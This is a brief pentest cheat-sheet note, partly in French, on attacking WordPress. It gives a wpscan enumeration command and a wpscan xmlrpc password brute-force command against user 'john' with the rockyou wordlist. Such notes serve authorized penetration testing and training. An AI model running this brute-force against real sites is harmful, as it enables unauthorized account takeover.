# Wordpress

Enumération:

wpscan --enumeration --url http://$url

Login bruteforce:

```shell-session
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://$url
```

